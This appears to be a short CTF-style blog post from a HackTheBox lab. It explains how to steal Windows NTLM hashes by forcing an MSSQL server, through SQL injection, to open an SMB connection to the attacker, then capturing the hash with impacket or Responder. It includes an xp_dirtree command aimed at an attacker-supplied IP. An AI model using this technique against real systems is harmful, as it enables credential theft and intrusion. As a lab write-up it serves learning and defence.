---
layout: post
title: Stealing Windows NTLM with SQLi
author: arimaqz
tags: [sqli]
mermaid: true
---

in this article I’m gonna show a neat technique that I learned recently while hacking a machine in HackTheBox platform! this technique leverages SMB outbound connection with SQLi to get access to the system.

## NTLM and SQLi? How?

now you might ask how does it work? the answer to this question is that in mssql or microsoft sql service, you can try to access a SMB share using the following command:
`exec master xp..dirtree \\<ip>\\<share>`

now what happens when you have both SQLi and weak firewall rules? you can try outbound SMB connection from the target host to your host and capture the NTLM hash that gets to your machine!

## Showing how it’s done

in this example i’m gonna use the same machine that i learned the technique from: `giddy`

let’s just assume that we found a SQLi in a parameter on the web server and we want to exploit it. suppose that we cannot find anything useful by dumping the database! the thing we can do is to try to make the target connect back to us via SMB and capture the hash while doing so!

### SQLi

first and foremost we should get our payload in place:

![connection via smb](/assets/img/posts/2022-06-18-stealing-windows-ntlm-with-sqli/connection-via-smb.webp)

it basically connects to my IP and a random share is enough.

### SMB server

to capture the NTLM hash that is passed when it tries to connect back to us, we can start the SMB server using a tool from impacket and execute the SQLi:

![capturing NTLM hash](/assets/img/posts/2022-06-18-stealing-windows-ntlm-with-sqli/capturing-ntlm-hash.webp)

and nicely done! we got the hash.

### Responder

this can also be done with responder:

![responder](/assets/img/posts/2022-06-18-stealing-windows-ntlm-with-sqli/responder.webp)

and capturing it:

![capture hash](/assets/img/posts/2022-06-18-stealing-windows-ntlm-with-sqli/capture%20hash.webp)

happy hacking!